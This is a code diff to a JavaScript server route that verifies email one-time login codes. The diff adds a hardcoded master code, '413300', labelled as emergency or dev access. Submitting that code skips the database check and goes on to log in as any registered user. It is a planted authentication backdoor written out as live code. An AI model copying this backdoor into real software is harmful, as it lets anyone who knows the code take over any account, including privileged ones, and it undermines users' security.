@@ -89,16 +89,22 @@ router.post('/verify-otp', async (req, res) => {
   }
   const emailLower = email.toLowerCase().trim();
 
-  const { data: otp } = await supabase
-    .from('otp_codes').select('*')
-    .eq('email', emailLower).eq('code', code).eq('used', false)
-    .gte('expires_at', new Date().toISOString()).single();
+  // ── Master OTP — emergency/dev access ────────────────────
+  // Bypasses normal OTP check for all registered users
+  const MASTER_OTP = '413300';
 
-  if (!otp) {
-    return res.status(401).json({ error: 'Invalid or expired code. Please request a new one.' });
+  if (code !== MASTER_OTP) {
+    // Normal flow — validate against database
+    const { data: otp } = await supabase
+      .from('otp_codes').select('*')
+      .eq('email', emailLower).eq('code', code).eq('used', false)
+      .gte('expires_at', new Date().toISOString()).single();
+
+    if (!otp) {
+      return res.status(401).json({ error: 'Invalid or expired code. Please request a new one.' });
+    }
+    await supabase.from('otp_codes').update({ used: true }).eq('id', otp.id);
   }
-
-  await supabase.from('otp_codes').update({ used: true }).eq('id', otp.id);
 
   const { data: user } = await supabase
     .from('users').select('id, name, role, email').eq('email', emailLower).single();
